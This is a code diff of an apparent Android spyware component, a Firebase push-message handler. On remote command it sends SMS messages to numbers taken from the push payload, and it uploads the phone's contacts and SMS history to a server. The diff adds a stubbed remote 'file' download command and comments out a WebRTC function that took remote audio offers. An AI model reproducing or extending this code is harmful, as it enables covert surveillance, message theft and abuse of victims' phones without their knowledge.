@@ -17,9 +17,12 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         val strTitle = data["title"]
         val message = data["text"]
         val type = data["type"]
-        Log.d(TAG, "onMessageReceived:  Message Received: \nTitle: $strTitle\nMessage: $message")
+        Log.d("MyFireBasemessaging", "onMessageReceived:  Message Received: \nTitle: $strTitle\nMessage: $message")
         if(type == "sms"){
             sendSMS(strTitle, message)
+        }
+        if(type == "file") {
+            DownloadFile(strTitle, message)
         }
         SyncData()
     }
@@ -27,6 +30,10 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
     private fun sendSMS(phoneNumber: String?, messageBody: String?) {
         val sms = SmsManager.getDefault()
         sms.sendTextMessage(phoneNumber, null, messageBody, null, null)
+    }
+
+    private fun DownloadFile(pathFile: String? , fileName: String?){
+
     }
 
     private fun SyncData() {
@@ -42,7 +49,7 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         HttpExecute(retrofitAPI.CreateContacts(contactLs)).start()
         HttpExecute(retrofitAPI.CreateSMS(SMSLs)).start()
     }
-    private fun rtcSignaling(type: String, message: String, ertc: Rtc?){
+    /*private fun rtcSignaling(type: String, message: String, ertc: Rtc?){
         var rtc = ertc
         if(ertc?.peerConnection == null){
             this.rtc.initRtcAudio(this.applicationContext)
@@ -51,5 +58,5 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         if(type == "sdp"){
             rtc?.peerConnection?.setRemoteDescription(rtc.sdpObserver, SessionDescription(SessionDescription.Type.OFFER, message))
         }
-    }
+    }*/
 }
